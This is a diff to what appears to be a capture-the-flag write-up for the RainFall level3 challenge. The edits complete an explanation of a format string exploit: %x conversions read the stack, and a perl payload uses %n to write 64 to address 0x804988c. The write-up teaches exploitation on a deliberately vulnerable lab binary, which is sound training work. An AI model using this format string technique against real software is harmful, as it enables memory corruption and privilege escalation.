@@ -54,7 +54,7 @@ This will allow us to write the value 0x40 (64 in decimal) in the address `0x804
 
 ## Exploit
 
-First of all, we inject as many `%x` conversion as needed to make printf move forward through the stack and reach the address were the string we provide to it is stored
+First of all, we inject as many `%x` conversion as needed to make printf move forward through the stack and reach the address where the string we have provided is stored.
 
 ```console
 level3@RainFall:~$ perl -e 'print "AAAA %08x %08x %08x %08x\n"' > /tmp/level3
@@ -62,7 +62,9 @@ level3@RainFall:~$ cat /tmp/level3 | ./level3
 AAAA 00000200 b7fd1ac0 b7ff37d0 41414141
 ```
 
-Here we have read the stack, and we know that the 4th converted argument that `printf` ## WIP ##
+Here we have read the first 16 bytes of the stack, and we know that the 4th converted argument that `printf` is the address of the supplied string (`AAAA` => `41414141`).
+
+We can now use the `%n` conversion which prints the number of characters written so far by `printf` to write the value 64 in the address `0x804988c`.
 
 ```console
 level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x0812345678901234567890123456789012345678901%x%x%x%n"' > /tmp/level3
